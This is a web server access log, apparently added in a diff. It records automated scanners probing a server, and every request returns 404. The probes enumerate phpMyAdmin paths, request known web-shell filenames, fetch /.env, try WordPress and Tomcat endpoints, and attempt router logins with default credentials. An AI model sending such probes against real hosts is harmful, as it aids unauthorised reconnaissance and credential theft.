+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /php-my-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2015/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /administrator/db/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/webdb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /admin/sysadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2011/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /administrator/pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /MyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /database/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/webadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/webdb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/db/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/dbadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2021/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/websql/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2015/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/websql/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /php-my-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/websql/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /admin/web/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /database/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/phpmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2020/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /shopdb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/db-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/webdb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /php-myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /PMA/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/webadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/sql-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2015/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/pMA/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /dbadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /_phpmyadmin_/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/webadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/web/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/php-myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/webadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /__phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /admin/db/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/websql/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2013/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /admin/sqladmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/web/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /admin/sysadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     72.13.46.3:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     72.13.46.3:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34684 - "GET /remote/fgt_lang HTTP/1.0" 404 Not Found
+INFO:     223.111.175.17:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     223.111.175.17:0 - "OPTIONS / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34690 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34692 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34694 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34698 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34700 - "GET /leaf.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34702 - "GET /alex.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34704 - "GET /mailer.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34706 - "GET /anone.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34708 - "GET /a.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34710 - "GET /wp-configer.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34712 - "GET /alfa.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34714 - "GET /wso.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34716 - "GET /c.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34718 - "GET /1.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34720 - "GET /send.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34722 - "GET /3.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34724 - "GET /404.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34726 - "GET /sym.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34728 - "GET /wp-confirm.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34730 - "GET /images/vuln.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34732 - "GET /dr.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34734 - "GET /upload.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34736 - "GET /bypass.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34738 - "GET /wp-blog.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34740 - "GET /data.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34742 - "GET /owl.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34744 - "GET /vuln.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34746 - "GET /symlink.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34748 - "GET /ohayo.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34750 - "GET /100.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34752 - "GET /777.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34754 - "GET /wp-content/wp-logins.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34756 - "GET /1index.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34758 - "GET /wp-wso.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34760 - "GET /2index.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34762 - "GET /wp-content/wp-admin.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34764 - "GET /wp-configer.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34766 - "GET /wp-admin.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34768 - "GET /mini.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34770 - "GET /old-index.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34772 - "GET /doc.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34774 - "GET /ups.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34776 - "GET /shx.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34778 - "GET /FoxWSO.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34780 - "GET /x.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34782 - "GET /cms.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34784 - "GET /stindex.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34786 - "GET /wp-uploads.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34788 - "GET /autoload_classmap.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34790 - "GET /Gel.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34792 - "GET /defau1t.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34794 - "GET /0byte.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34796 - "GET /wp.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34798 - "GET /41.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34800 - "GET /media-admin.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34802 - "GET /4price.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34804 - "GET /MARIJUANA.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34806 - "GET /f.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34808 - "GET /.fk.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34810 - "GET /wikindex.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34812 - "GET /xox.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34814 - "GET /o.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34816 - "GET /new.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34818 - "GET /3index.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34820 - "GET /sindex.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34822 - "GET /baindex.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34824 - "GET /new-index.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34826 - "GET /wi.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34828 - "GET /XxX.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34830 - "GET /mar.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34832 - "GET /root.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34834 - "GET /11index.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34836 - "GET /wp-login.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34838 - "GET /nee.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34840 - "GET /v.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34842 - "GET /z.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34844 - "GET /xx.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34846 - "GET /g.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34848 - "GET /m.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34850 - "GET /shell.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34852 - "GET /sh3ll.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34854 - "GET /c99.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34856 - "GET /alexuse.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34858 - "GET /w.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34860 - "GET /ws.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34862 - "GET /2.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34864 - "GET /lol.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34866 - "GET /87.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34868 - "GET /7yn.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34870 - "GET /haxor.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34872 - "GET /403.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34874 - "GET /13.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34876 - "GET /cpanel.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34878 - "GET /%5B6%3A13%20PM%5D HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34880 - "GET /wp-configr.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34882 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34884 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     142.93.155.126:43090 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     142.93.155.126:43112 - "GET /api/islogged HTTP/1.1" 404 Not Found
+INFO:     103.138.120.252:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.128.232.149:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     185.180.143.6:42368 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34892 - "GET / HTTP/1.0" 404 Not Found
+INFO:     94.102.51.9:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34896 - "GET / HTTP/1.0" 404 Not Found
+INFO:     94.102.51.9:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34900 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34902 - "GET /.well-known/security.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34904 - "GET /security.txt HTTP/1.0" 404 Not Found
+INFO:     175.107.13.13:0 - "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 Not Found
+INFO:     185.225.74.42:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34910 - "GET /ab2g HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34912 - "GET /ab2h HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34914 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34916 - "GET /t4 HTTP/1.0" 404 Not Found
+INFO:     103.167.135.38:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     103.167.135.38:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34922 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34924 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34926 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34928 - "GET /.well-known/security.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34930 - "GET /security.txt HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34934 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34936 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     45.90.60.144:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     89.104.100.215:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34944 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     117.187.173.121:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34948 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34950 - "GET / HTTP/1.0" 404 Not Found
+INFO:     42.83.147.55:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     54.185.226.222:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     164.90.169.84:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     200.123.30.236:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     200.123.30.236:0 - "GET /manager/html HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35002 - "GET / HTTP/1.0" 404 Not Found
+INFO:     58.17.6.9:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35006 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.225.74.42:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     89.187.163.135:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35050 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.180.143.71:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     14.29.228.249:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     111.7.100.22:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     66.240.236.109:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35060 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35062 - "GET / HTTP/1.0" 404 Not Found
+INFO:     175.107.13.194:0 - "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /media/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     139.59.165.194:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     117.187.173.77:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35110 - "GET / HTTP/1.0" 404 Not Found
+INFO:     54.218.227.220:0 - "GET /wp-login.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35114 - "GET / HTTP/1.0" 404 Not Found
+INFO:     5.160.196.156:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35120 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.81.243.34:0 - "GET / HTTP/1.0" 404 Not Found
